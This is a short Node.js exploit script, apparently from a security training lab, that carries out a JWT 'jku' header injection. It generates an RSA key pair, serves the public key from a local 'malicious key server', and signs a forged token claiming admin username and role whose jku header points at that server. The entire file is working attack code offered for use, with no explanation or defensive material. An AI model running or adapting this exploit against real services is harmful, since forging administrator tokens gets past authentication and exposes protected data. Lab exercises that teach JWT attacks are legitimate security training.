const jose = require('node-jose');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const express = require('express');

// Create a malicious key server
const app = express();
const PORT = 3002;

async function generateExploit() {
    // Generate our own key pair
    const keyStore = jose.JWK.createKeyStore();
    const key = await keyStore.generate('RSA', 2048, {
        use: 'sig',
        alg: 'RS256',
        kid: 'lab4-key'
    });

    // Serve our public key
    app.get('/jwks.json', (req, res) => {
        res.json({ keys: [key.toJSON()] });
    });

    // Create malicious token
    const token = jwt.sign({
        username: 'admin',
        role: 'admin',
        lab: 'lab4'
    }, key.toPEM(true), {
        algorithm: 'RS256',
        header: {
            jku: 'http://localhost:3002/jwks.json',  // Point to our malicious key server
            kid: 'lab4-key'
        }
    });

    console.log('\n=== Malicious Token ===');
    console.log(token);
    console.log('\n=== Start the key server and use this token to access admin data ===');

    // Start the server
    app.listen(PORT, () => {
        console.log(`Malicious key server running on port ${PORT}`);
    });
}

generateExploit(); 
